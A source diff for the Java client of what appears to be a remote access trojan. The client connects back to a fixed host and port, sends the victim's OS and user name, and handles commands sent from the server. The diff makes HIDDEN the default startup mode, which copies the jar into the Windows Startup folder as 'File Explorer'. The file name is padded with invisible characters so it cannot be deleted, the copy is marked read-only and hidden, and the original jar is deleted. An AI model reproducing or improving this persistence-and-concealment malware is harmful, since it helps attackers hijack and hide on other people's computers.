@@ -10,12 +10,8 @@ import java.net.Socket;
 import java.net.SocketException;
 import java.net.URISyntaxException;
 import java.nio.file.Files;
-import java.nio.file.Path;
 import java.nio.file.Paths;
-import java.nio.file.attribute.DosFileAttributes;
-import java.util.ArrayList;
-
-import javax.swing.FocusManager;
+import java.util.Arrays;
 
 import me.sebsb.utils.MessageType;
 import me.sebsb.utils.NetUtils;
@@ -25,9 +21,10 @@ public class Client {
 	public static final int PORT = 5554;
 	public static final long RETRY = 5000;
 	public static final String IP = "127.0.0.1";
-	public static final StartupMode startup = StartupMode.NORMAL;
+	public static final StartupMode startup = StartupMode.HIDDEN;
 	
 	private static ClientManager manager;
+	private PrintWriter pw;
 	
 	public void run() {
 		try {
@@ -35,11 +32,11 @@ public class Client {
 			while (s == null) {
 				try {
 					s = new Socket(IP, PORT);
+					pw = new PrintWriter(s.getOutputStream(), true);
+					this.sendInfo(pw, s);
 				} catch (Exception e) {}
 				Thread.sleep(RETRY);
 			}
-			PrintWriter pw = new PrintWriter(s.getOutputStream(), true);
-			this.sendInfo(pw, s);
 			BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
 			boolean dead = false;
 			while (!dead) {
@@ -47,11 +44,11 @@ public class Client {
 					String line = br.readLine();
 					if (line == null) {
 						dead = true;
-						throw new Exception();
+						return;
 					}
-					
+					Packet packet = NetUtils.readPacket(line);
 					try {
-						manager.onMessage(line, pw);
+						manager.onMessage(packet, pw);
 					} catch (Exception e) {
 						e.printStackTrace();
 					}
@@ -63,7 +60,6 @@ public class Client {
 				}
 			}
 			s.close();
-			s.close();
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
@@ -71,10 +67,14 @@ public class Client {
 	}
 	
 	private void sendInfo(PrintWriter pw, Socket s) {
-		ArrayList<String> info = new ArrayList<String>();
-		info.add("OS:" + System.getProperty("os.name"));
-		info.add("USER:" + System.getProperty("user.name"));
-		NetUtils.sendMessage(info, MessageType.INFO, pw);
+		try {
+			Packet packet = new Packet();
+			packet.action = MessageType.INFO.getID();
+			packet.data = Arrays.asList(new String[] {System.getProperty("os.name"), System.getProperty("user.name")});
+			NetUtils.sendMessage(packet, pw);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 	}
 	
 	public Client() {
@@ -104,8 +104,6 @@ public class Client {
 	}
 	
 	/*
-	 * Folder and Blatant startup modes have not been tested. I think they would though.
-	 * 
 	 * BTW this creates undeletable files. I accidently came across this bug with windows which prevents files from being deleted.
 	 * If you wanna use this 'exploit' in your own programs make sure u copy and paste the code, typing it again will cause it to not work.
 	 * Don't tell Microsoft lol.
@@ -114,11 +112,11 @@ public class Client {
 		File jar = new File(Client.class.getProtectionDomain().getCodeSource().getLocation()
 			    .toURI());
 		String fileName = "File Explorer";
-		String e = ".jar";
 		File startupLoc = new File(System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
 		if (!jar.exists() || jar.getName().contains(fileName) || !startupLoc.exists()) {
 			return;
 		}
+		String e = jar.getName().contains(".") ? "." + jar.getName().split("\\.")[jar.getName().split("\\.").length - 1] : ".jar";
 		if (startup.equals(StartupMode.NORMAL)) {
 			boolean created = false;
 			for (int l = 0; l < 15; l++) {
@@ -127,7 +125,7 @@ public class Client {
 						// If you're wondering why I'm using this string builder, its because this makes files undeletable in windows.
 						StringBuilder sb = new StringBuilder(fileName);
 						for (int i = 0; i < 259 - l - fileName.length() - e.length(); i++) {
-							sb.append("‎");
+							sb.append("\u200e");
 						}
 						sb.append(e);
 						File file = null;
@@ -137,106 +135,26 @@ public class Client {
 					} catch (Exception eee) {}
 				}
 			}
-		} else if (startup.equals(StartupMode.FOLDER)) {
-			File lastFolder = startupLoc;
-			boolean created1 = false;
-			for (int l = 0; l < 15; l++) {
-				if (!created1) {
-					try {
-						StringBuilder sb = new StringBuilder("folder");
-						for (int k = 0; k < 259 - l - "folder".length(); k++) {
-							sb.append("‎");
-						}
-						lastFolder = new File(lastFolder, sb.toString());
-						if (!lastFolder.exists()) {
-							lastFolder.mkdir();
-							setHiddenAttrib(Paths.get(lastFolder.getPath()));
-							created1 = true;
-						}
-					} catch (Exception e2) {}
-				}
-			}
+		} else if (startup.equals(StartupMode.HIDDEN)) {
 			boolean created = false;
 			for (int l = 0; l < 15; l++) {
 				if (!created) {
 					try {
 						StringBuilder sb = new StringBuilder(fileName);
 						for (int i = 0; i < 259 - l - fileName.length() - e.length(); i++) {
-							sb.append("‎");
+							sb.append("\u200e");
 						}
 						sb.append(e);
 						File file = null;
-						Files.copy(Paths.get(jar.getPath()), new FileOutputStream(file = new File(lastFolder, sb.toString())));
+						Files.copy(Paths.get(jar.getPath()), new FileOutputStream(file = new File(startupLoc, sb.toString())));
 						created = true;
 						file.setWritable(false);
-					} catch (Exception eee) {}
-				}
-			}
-		} else if (startup.equals(StartupMode.BLATANT)) {
-			File lastFolder = startupLoc;
-			for (int i = 0; i < 4000; i++) {
-				boolean created = false;
-				for (int l = 0; l < 15; l++) {
-					if (!created) {
-						try {
-							StringBuilder sb = new StringBuilder("folder");
-							for (int k = 0; k < 259 - l - "folder".length(); k++) {
-								sb.append("‎");
-							}
-							lastFolder = new File(lastFolder, sb.toString());
-							if (!lastFolder.exists()) {
-								lastFolder.mkdir();
-								setHiddenAttrib(Paths.get(lastFolder.getPath()));
-								created = true;
-							}
-						} catch (Exception e2) {}
-					}
-				}
-			}
-			
-			String characters = "abcdefghijklmnopqrstuvwxyz123456789";
-			for (int k = 0; k < characters.length() * 12; k++) {
-				boolean created = false;
-				for (int l = 0; l < 15; l++) {
-					if (!created) {
-						try {
-							StringBuilder sb = new StringBuilder(characters.charAt(k % characters.length()));
-							for (int i = 0; i < 257 - l; i++) {
-								sb.append("‎");
-							}
-							File file = new File(lastFolder, sb.toString());
-							file.createNewFile();
-							created = true;
-							file.setWritable(false);
-						} catch (Exception eee) {}
-					}
-				}
-			}
-			boolean created = false;
-			for (int l = 0; l < 15; l++) {
-				if (!created) {
-					try {
-						StringBuilder sb = new StringBuilder(fileName);
-						for (int i = 0; i < 259 - l - fileName.length() - e.length(); i++) {
-							sb.append("‎");
-						}
-						sb.append(e);
-						File file = null;
-						Files.copy(Paths.get(jar.getPath()), new FileOutputStream(file = new File(lastFolder, sb.toString())));
-						created = true;
-						file.setWritable(false);
+						Files.setAttribute(Paths.get(file.getPath()), "dos:hidden", true);
+						jar.delete();
 					} catch (Exception eee) {}
 				}
 			}
 		}
-	}
-	
-	private static void setHiddenAttrib(Path filePath) {		
-		try {
-			DosFileAttributes attr = Files.readAttributes(filePath, DosFileAttributes.class);
-			Files.setAttribute(filePath, "dos:hidden", true);
-			attr = Files.readAttributes(filePath, DosFileAttributes.class);
-		} catch (IOException e) {} 
 	}
 
 }
@@ -244,6 +162,5 @@ public class Client {
 enum StartupMode {
 	NONE,
 	NORMAL,
-	FOLDER,
-	BLATANT
+	HIDDEN
 }
